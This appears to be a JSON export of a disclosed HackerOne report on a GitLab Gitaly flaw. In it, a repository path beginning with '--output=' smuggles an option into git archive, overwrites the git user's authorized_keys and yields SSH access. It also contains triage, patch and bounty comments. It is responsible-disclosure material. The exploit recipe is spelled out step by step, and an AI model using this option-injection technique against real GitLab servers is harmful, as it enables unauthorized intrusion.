@@ -1,0 +1,422 @@
+{
+  "id": 587854,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODc4NTQ=",
+  "url": "https://hackerone.com/reports/587854",
+  "title": "Local files could be overwritten in GitLab, leading to remote command execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-22T14:27:06.680Z",
+  "submitted_at": "2019-05-22T14:27:06.680Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "saltyyolk",
+    "url": "/saltyyolk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-07-17T00:23:37.470Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-17T00:23:37.320Z",
+  "team_member_agreed_on_going_public_at": "2019-07-16T19:02:26.358Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n#### Arbitrary file overwrite\nA new feature (download a directory of a repository) in GitLab 11.11 introduced some changes in `./internal/service/repository/archive.go` of Gitaly.\n```go\nfunc handleArchive(ctx context.Context, writer io.Writer, in *gitalypb.GetArchiveRequest, compressCmd *exec.Cmd, format string, path string) error {                                                           \n        archiveCommand, err := git.Command(ctx, in.GetRepository(), \"archive\",                          \n                \"--format=\"+format, \"--prefix=\"+in.GetPrefix()+\"/\", in.GetCommitId(), path) \n...\n```\n\nA new parameter `path` is concatenated to the command, the parameter is supposed to carry the path of the directory to be downloaded in the repository. However, Gitaly could be misled by an attacker if the path starts with double dashes, for example:\n```shell\n$ tree\n.\n└── --output=\n    └── var\n        └── opt\n            └── gitlab\n                └── .ssh\n                    └── authorized_keys\n                        └── id_ed25519.pub\n```\n\nSuppose we have a repository which has only one file `id_ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized_keys/`. What happens in Gitaly when I click `download directory as tar` under this directory? The actual command get executed here is:\n```\ngit --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys\n```\n\nThe content of the archive gets written to the `/var/opt/gitlab/.ssh/authorized_keys` file instead of transferred to the user.\n\n#### RCE\nThe reason I choose `tar` as the format is that `tar` doesn't compress the content, all contents in the repository are preserved with some tar headers concatenated into the output.\n\nIn the above example:\nContent of  `id_ed25519.pub`\n```\n#\nssh-ed25519 ██████\n#\n```\nContent of  the overwritten `authorized_keys`\n```\n~/workspace/gitlab/archive$ docker exec -ti e1a bash\nroot@localhost:/# cat /var/opt/gitlab/.ssh/authorized_keys \npax_global_header00006660000000000000000000000064134712530140014512gustar00rootroot0000000000000052 comment=412e285af38342030e5e30fcba77cb4296fb245d\narchive-master---output=-var-opt-gitlab-.ssh-authorized_keys/000077500000000000000000000000001347125301400244635ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/000077500000000000000000000000001347125301400262525ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/000077500000000000000000000000001347125301400270425ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/000077500000000000000000000000001347125301400276445ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/000077500000000000000000000000001347125301400311065ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/000077500000000000000000000000001347125301400317615ustar00rootroot00000000000000authorized_keys/000077500000000000000000000000001347125301400351135ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.sshid_ed25519.pub000066400000000000000000000001661347125301400373000ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/authorized_keys#\nssh-ed25519 ████████ \n#\n```\n\nSSH server allows dummy content in the `authorized_keys` file, as long as the public keys are started with a new line.\n\nSo, after the exploit:\n```\n$ ssh -i ~/.ssh/id_ed25519 git@10.26.0.3\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n$ whoami\ngit\n$ \n```\n\n### Steps to reproduce\n\nAs stated above.\n\n### Impact\n\nFor most self-hosted single instance GitLab users, this is a RCE issue.\n\nFor those who has Gitaly running in different OS with gitlab-shell, the impact varies and depends on different circumstances.\n\nFor GitLab.com, as the described PoC is destructive and it's hard to observe if I choose some other files to overwrite. I didn't test and I want to leave the evaluation of impact to you guys. :p\n\n#### Results of GitLab environment info\n```\nroot@localhost:/# gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\t\t\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.5.3p105\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.21.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t11.11.0\nRevision:\t3e8ca2fb781\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t9.6.11\nURL:\t\thttp://10.26.0.3\nHTTP Clone URL:\thttp://10.26.0.3/some-group/some-project.git\nSSH Clone URL:\tgit@10.26.0.3:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t9.1.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nOS command injections usually lead to serious results, remote code execution in this case.",
+  "bounty_amount": "12000.0",
+  "formatted_bounty": "$12,000",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 536,
+  "voters": [
+    "overjt",
+    "sky003",
+    "is-",
+    "mirchr",
+    "0xsaltyhashes",
+    "uceka_",
+    "n1m0",
+    "sp1d3rs",
+    "p1stachios",
+    "cdl",
+    "and 526 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 4902802,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Actually, about where the bug lies in, I once had a tiny peek on the changes (added `path` parameter without any guards) in Gitaly. But I didn't find any real use-cases of this new-added parameter in the source code of  `gitlab-org/gitlab-ce`. Therefore I didn't know how or report or describe the potential vulnerability to you. :(\n\nDo you have any ideas on how to handle this kind of circumstances that a potential bug without any known attacking vectors lies in the master branch or some release candidates? It might be useful if we could work together to get ride of these risks before a formal release coming out. Like some random slack channels as an extra communicating channel?",
+      "automated_response": false,
+      "created_at": "2019-05-22T14:37:45.888Z",
+      "updated_at": "2019-05-22T14:38:14.873Z",
+      "actor": {
+        "username": "saltyyolk",
+        "cleared": false,
+        "verified": false,
+        "url": "/saltyyolk",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4903079,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nyangawa,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2019-05-22T15:22:20.632Z",
+      "updated_at": "2019-05-22T15:22:20.632Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4903207,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello,\n\nNice finding, thank you for submitting this report!\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ce/issues/62174.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.",
+      "automated_response": false,
+      "created_at": "2019-05-22T15:49:38.837Z",
+      "updated_at": "2019-05-22T15:49:38.837Z",
+      "actor": {
+        "username": "hackerjuan",
+        "cleared": false,
+        "verified": false,
+        "url": "/hackerjuan",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4903277,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> It might be useful if we could work together to get ride of these risks before a formal release coming out. Like some random slack channels as an extra communicating channel?\n\nThis is a great idea, we will discuss the possible options internally and inform you when we come up with a decision.\n\n",
+      "automated_response": false,
+      "created_at": "2019-05-22T16:09:16.440Z",
+      "updated_at": "2019-05-22T16:09:53.029Z",
+      "actor": {
+        "username": "hackerjuan",
+        "cleared": false,
+        "verified": false,
+        "url": "/hackerjuan",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4981647,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi,\n\nThank you again for the report! Your finding has been patched in GitLab version 11.11.1 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nRegarding the collaboration proposal to prevent this kind of issues, we believe the best way to do it is through our HackerOne bug bounty program. Feel free to report potential security issues along with an impact statement, explaining why the finding would be critical or high and we will investigate and reward it accordingly.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n",
+      "automated_response": false,
+      "created_at": "2019-06-03T14:17:42.485Z",
+      "updated_at": "2019-06-03T14:17:42.485Z",
+      "actor": {
+        "username": "hackerjuan",
+        "cleared": false,
+        "verified": false,
+        "url": "/hackerjuan",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "saltyyolk",
+        "url": "/saltyyolk"
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4981657,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-06-03T14:19:08.217Z",
+      "updated_at": "2019-06-03T14:19:08.217Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_amount": "12000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "saltyyolk",
+        "url": "/saltyyolk"
+      }
+    },
+    {
+      "id": 4992875,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @hackerjuan ,\n\nThanks a lot for your information. I've verified the patch and I think it works perfectly.\n\nAbout the blog https://about.gitlab.com/2019/06/03/security-release-gitlab-11-dot-11-dot-1-released/\nWould you please help me to make some modifications? Due to the compliance of my company I'd like to make the following change. Like that in some [earlier posts](https://about.gitlab.com/2018/12/06/critical-security-release-gitlab-11-dot-5-dot-3-released/)\n```\n@nyangawa -> @nyangawa of Chaitin Tech\n```\n\nThank you again for your work and understanding and I'm looking forward to co-operate with you again in the future.\nLi",
+      "automated_response": false,
+      "created_at": "2019-06-04T11:37:28.290Z",
+      "updated_at": "2019-06-04T11:37:28.290Z",
+      "actor": {
+        "username": "saltyyolk",
+        "cleared": false,
+        "verified": false,
+        "url": "/saltyyolk",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4993707,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We've updated the blog post as requested. Thank you again!",
+      "automated_response": false,
+      "created_at": "2019-06-04T13:47:11.015Z",
+      "updated_at": "2019-06-04T13:47:11.015Z",
+      "actor": {
+        "username": "hackerjuan",
+        "cleared": false,
+        "verified": false,
+        "url": "/hackerjuan",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4994313,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot ;)",
+      "automated_response": false,
+      "created_at": "2019-06-04T14:49:56.376Z",
+      "updated_at": "2019-06-04T14:49:56.376Z",
+      "actor": {
+        "username": "saltyyolk",
+        "cleared": false,
+        "verified": false,
+        "url": "/saltyyolk",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5336968,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-07-16T19:02:26.420Z",
+      "updated_at": "2019-07-16T19:02:26.420Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "hackerjuan",
+        "cleared": false,
+        "verified": false,
+        "url": "/hackerjuan",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5339226,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-07-17T00:23:37.374Z",
+      "updated_at": "2019-07-17T00:23:37.374Z",
+      "actor": {
+        "username": "saltyyolk",
+        "cleared": false,
+        "verified": false,
+        "url": "/saltyyolk",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5339227,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-07-17T00:23:37.495Z",
+      "updated_at": "2019-07-17T00:23:37.495Z",
+      "actor": {
+        "username": "saltyyolk",
+        "cleared": false,
+        "verified": false,
+        "url": "/saltyyolk",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
